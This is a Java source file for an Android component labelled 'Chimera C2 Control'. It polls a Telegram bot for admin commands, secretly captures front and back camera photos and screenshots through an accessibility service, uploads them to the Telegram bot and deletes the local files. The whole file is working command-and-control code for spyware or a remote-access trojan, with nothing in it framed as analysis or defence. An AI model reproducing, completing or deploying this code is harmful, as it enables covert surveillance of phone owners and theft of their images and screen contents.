package com.chimera;

import android.content.Context;
import android.content.Intent;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TelegramBotWorker implements Runnable {
    private final Context context;
    private long lastUpdateId = 0;
    private final int pollInterval = 3000; // Poll every 3 seconds

    public TelegramBotWorker(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public void run() {
        while (!Thread.currentThread().isInterrupted()) {
            try {
                pollForUpdates();
                Thread.sleep(pollInterval);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt(); // Restore the interrupted status
                break;
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_RunLoop", e);
                // Wait longer if there's a network error
                try {
                    Thread.sleep(30000);
                } catch (InterruptedException interruptedException) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }
    }

    private void pollForUpdates() {
        try {
            String token = ConfigLoader.getBotToken();
            long adminId = ConfigLoader.getAdminId();
            if (token == null || adminId == 0) return;

            String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=10";
            if (lastUpdateId > 0) {
                urlStr += "&offset=" + (lastUpdateId + 1);
            }

            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            // Read response
            InputStream is = conn.getInputStream();
            ByteArrayOutputStream result = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int length;
            while ((length = is.read(buffer)) != -1) {
                result.write(buffer, 0, length);
            }
            String responseStr = result.toString("UTF-8");
            is.close();
            conn.disconnect();

            // Process response
            JSONObject responseJson = new JSONObject(responseStr);
            if (!responseJson.getBoolean("ok")) return;

            JSONArray updates = responseJson.getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                JSONObject update = updates.getJSONObject(i);
                lastUpdateId = update.getLong("update_id");

                if (update.has("message")) {
                    JSONObject message = update.getJSONObject("message");
                    long chatId = message.getJSONObject("chat").getLong("id");
                    if (chatId == adminId && message.has("text")) {
                        handleMessage(message);
                    }
                } else if (update.has("callback_query")) {
                    JSONObject callbackQuery = update.getJSONObject("callback_query");
                    long chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getLong("id");
                    if (chatId == adminId) {
                        handleCallback(callbackQuery);
                    }
                }
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_Poll", e);
        }
    }

    private void handleMessage(JSONObject msg) {
        try {
            String text = msg.getString("text");
            long chatId = msg.getJSONObject("chat").getLong("id");

            if (text.startsWith("/")) {
                String command = text.split(" ")[0].toLowerCase();
                switch (command) {
                    case "/start":
                    case "/help":
                        sendHelpMessage(chatId);
                        break;
                    case "/command":
                        sendMenu(chatId);
                        break;
                }
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_HandleMessage", e);
        }
    }

    private void handleCallback(JSONObject cb) {
        try {
            String data = cb.getString("data");
            long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");

            switch (data) {
                case "CAM1":
                case "CAM2":
                    sendMessage("Taking picture with " + data + "...", context);
                    CameraHandler.takePicture(context, data, new CameraHandler.CameraCallback() {
                        @Override
                        public void onPictureTaken(String filePath) {
                            uploadFile(filePath, chatId, data + " Picture", context);
                        }
                        @Override
                        public void onError(String error) {
                            sendMessage("Camera Error: " + error, context);
                        }
                    });
                    break;

                case "SCREENSHOT":
                    if (AutoClickerAccessibilityService.isServiceEnabled()) {
                        sendMessage("Requesting screen capture...", context);
                        // Send an Intent to the service to start the screenshot process.
                        // This is the correct way to communicate from a worker thread to a Service.
                        Intent intent = new Intent(context, TelegramC2Service.class);
                        intent.setAction("ACTION_PREPARE_SCREENSHOT");
                        context.startService(intent);
                    } else {
                        sendMessage("Screenshot failed: Accessibility Service is not enabled.", context);
                    }
                    break;
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_HandleCallback", e);
        }
    }

    private void sendHelpMessage(long chatId) {
        String helpText = "Chimera C2 Control\n\n" +
                "/command - Show the command menu.\n" +
                "/help - Show this help message.\n\n" +
                "Button Commands:\n" +
                "  \uD83D\uDCF7 CAM1: Front camera photo\n" + // Camera emoji
                "  \uD83D\uDCF8 CAM2: Back camera photo\n" + // Camera with flash emoji
                "  \uD83D\uDCF1 SCREENSHOT: Capture screen"; // Mobile phone emoji
        sendMessage(helpText, context);
    }

    private void sendMenu(long chatId) {
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray row1 = new JSONArray();
            JSONObject cam1Button = new JSONObject().put("text", "\uD83D\uDCF7 CAM1").put("callback_data", "CAM1");
            JSONObject cam2Button = new JSONObject().put("text", "\uD83D\uDCF8 CAM2").put("callback_data", "CAM2");
            row1.put(cam1Button).put(cam2Button);

            JSONArray row2 = new JSONArray();
            JSONObject screenshotButton = new JSONObject().put("text", "\uD83D\uDCF1 SCREENSHOT").put("callback_data", "SCREENSHOT");
            row2.put(screenshotButton);

            keyboard.put("inline_keyboard", new JSONArray().put(row1).put(row2));

            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("text", "Select a command:");
            body.put("reply_markup", keyboard);

            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", body.toString(), context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_SendMenu", e);
        }
    }

    // --- Networking Methods ---

    public static void sendMessage(String message, Context context) {
        try {
            long chatId = ConfigLoader.getAdminId();
            if (chatId == 0) return;
            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("text", message);
            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", body.toString(), context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_SendMessageHelper", e);
        }
    }

    public static void post(String urlStr, String jsonBody, Context context) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
                }

                // We must read the response for the request to complete.
                conn.getResponseCode();
                conn.getInputStream().close();

            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_Post", e);
            } finally {
                if (conn != null) {
                    conn.disconnect();
                }
            }
        }).start();
    }

    public static void uploadFile(String filePath, long chatId, String caption, Context context) {
        new Thread(() -> {
            String token = ConfigLoader.getBotToken();
            if (token == null) return;
            String urlStr = "https://api.telegram.org/bot" + token + "/sendPhoto";
            String boundary = "Boundary-" + System.currentTimeMillis();
            String LINE_FEED = "\r\n";
            HttpURLConnection conn = null;

            File fileToUpload = new File(filePath);
            if (!fileToUpload.exists()) {
                sendMessage("File to upload not found: " + filePath, context);
                return;
            }

            try {
                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(30000);

                try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
                    // Chat ID part
                    writer.append("--").append(boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED);
                    writer.append(LINE_FEED);
                    writer.append(String.valueOf(chatId)).append(LINE_FEED);

                    // Caption part
                    writer.append("--").append(boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED);
                    writer.append(LINE_FEED);
                    writer.append(caption).append(LINE_FEED);

                    // File part
                    writer.append("--").append(boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"").append(fileToUpload.getName()).append("\"").append(LINE_FEED);
                    writer.append("Content-Type: image/jpeg").append(LINE_FEED);
                    writer.append(LINE_FEED);
                    writer.flush();

                    try (FileInputStream fis = new FileInputStream(fileToUpload)) {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = fis.read(buffer)) != -1) {
                            os.write(buffer, 0, bytesRead);
                        }
                        os.flush();
                    }
                    writer.append(LINE_FEED);
                    writer.append("--").append(boundary).append("--").append(LINE_FEED);
                }

                // We must read the response for the request to complete.
                conn.getResponseCode();
                conn.getInputStream().close();

            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_UploadFile", e);
                sendMessage("Failed to upload file: " + e.getMessage(), context);
            } finally {
                if (conn != null) {
                    conn.disconnect();
                }
                // Clean up the captured file
                fileToUpload.delete();
            }
        }).start();
    }
}